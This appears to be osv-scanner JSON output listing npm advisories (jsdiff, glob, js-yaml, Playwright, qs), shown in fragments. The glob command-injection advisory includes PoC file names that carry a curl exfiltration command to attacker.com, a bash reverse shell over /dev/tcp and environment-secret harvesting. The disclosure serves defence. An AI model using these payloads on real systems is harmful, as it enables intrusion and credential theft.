Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.","references":[{"type":"WEB","url":"https://github.com/kpdecker/jsdiff/security/advisories/GHSA-73rr-hh4g-fpgx"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2026-24001"},{"type":"WEB","url":"https://github.com/kpdecker/jsdiff/issues/653"},{"type":"WEB","url":"https://github.com/kpdecker/jsdiff/pull/649"},{"type":"WEB","url":"https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5"},{"type":"PACKAGE","url":"https://github.com/kpdecker/jsdiff"}]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.139Z"}},{"id":"GHSA-5j98-mcp5-4vw2@glob-10.3.10","package":{"name":"glob","version":"10.3.10","ecosystem":"npm","purl":"pkg:npm/glob"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"},"affectedVersions":{"ranges":[{"introduced":"11.0.0","fixed":"11.1.0"}]},"fix":{"available":true,"version":"11.1.0"},"details":{"title":"glob CLI: Command injection via -c/--cmd executes matches with shell:true","description":"### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.140Z"}},{"id":"GHSA-mh29-5h37-fv8m@js-yaml-3.14.1","package":{"name":"js-yaml","version":"3.14.1","ecosystem":"npm","purl":"pkg:npm/js-yaml"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},"affectedVersions":{"ranges":[{"introduced":"4.0.0","fixed":"4.1.1"}]},"fix":{"available":true,"version":"4.1.1"},"details":{"title":"js-yaml has prototype pollution in merge (<<)","description":"### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`).

An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)","references":[{"type":"WEB","url":"https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-59288"},{"type":"WEB","url":"https://github.com/microsoft/playwright/pull/37532"},{"type":"WEB","url":"https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570"},{"type":"PACKAGE","url":"https://github.com/microsoft/playwright"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.55.1"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.56.0"},{"type":"WEB","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288"}],"aliases":["CVE-2025-59288"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.143Z"}},{"id":"GHSA-6rw7-vpxm-498p@qs-6.14.0","package":{"name":"qs","version":"6.14.0","ecosystem":"npm","purl":"pkg:npm/qs"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"6.14.1"}]},"fix":{"available":true,"version":"6.14.1"},"details":{"title":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","description":"### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion.

Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).","references":[{"type":"WEB","url":"https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-15284"},{"type":"WEB","url":"https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9"},{"type":"PACKAGE","url":"https://github.com/ljharb/qs"}],"aliases":["CVE-2025-15284"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.143Z"}}],"metadata":{"vulnerabilities":{"info":0,"low":3,"moderate":15,"high":15,"critical":0}}}}
